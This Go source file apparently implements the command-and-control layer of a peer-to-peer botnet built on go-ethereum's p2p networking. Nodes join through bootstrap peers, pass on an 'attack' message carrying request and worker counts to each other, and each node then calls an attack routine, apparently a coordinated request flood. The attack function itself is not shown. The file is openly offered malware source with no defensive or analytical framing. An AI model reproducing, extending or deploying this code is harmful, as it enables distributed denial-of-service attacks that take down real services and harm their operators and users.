package main

import (
	"fmt"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/discover"
	"strconv"
	"strings"
)

const messageId = 0

type Message struct {
	NReq     uint64
	NWorkers uint64
	Attack   uint64
	NodeId   string
}

func BotProtocol() p2p.Protocol {
	return p2p.Protocol{
		Name:    "BotProtocol",
		Version: 1,
		Length:  1,
		Run:     msgHandler,
	}
}

func startServer() *p2p.Server {
	key, _ := crypto.GenerateKey()
	bootNodes := strings.Split(*BootNodes, ",")

	var peers []*discover.Node
	for _, n := range bootNodes {
		if len(n) > 0 {
			node, _ := discover.ParseNode(n)
			peers = append(peers, node)
		}
	}
	config := p2p.Config{
		Name:           "Bot",
		MaxPeers:       10,
		ListenAddr:     ":" + strconv.Itoa(*Port),
		PrivateKey:     key,
		Protocols:      []p2p.Protocol{BotProtocol()},
		BootstrapNodes: peers,
	}
	server := &p2p.Server{
		Config: config,
	}
	return server
}

func msgHandler(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
	if *Attack == 1 {
		p2p.SendItems(rw, messageId, Message{uint64(*NReq), uint64(*NWorkers), uint64(*Attack), NodeId})
	}
	for {
		msg, err := rw.ReadMsg()
		if err != nil {
			return err
		}

		var myMessage [1]Message
		err = msg.Decode(&myMessage)
		if err != nil {
			continue
		}

		switch myMessage[0].Attack {
		case 1:
			if NodeId != myMessage[0].NodeId {
				fmt.Println("Starting attack", myMessage)
				err := p2p.SendItems(rw, messageId, Message{myMessage[0].NReq, myMessage[0].NWorkers, myMessage[0].Attack, myMessage[0].NodeId})
				attack(int(myMessage[0].NReq), int(myMessage[0].NWorkers))
				if err != nil {
					return err
				}
			}
		default:
			fmt.Println("recv:", myMessage)
		}
	}

	return nil
}
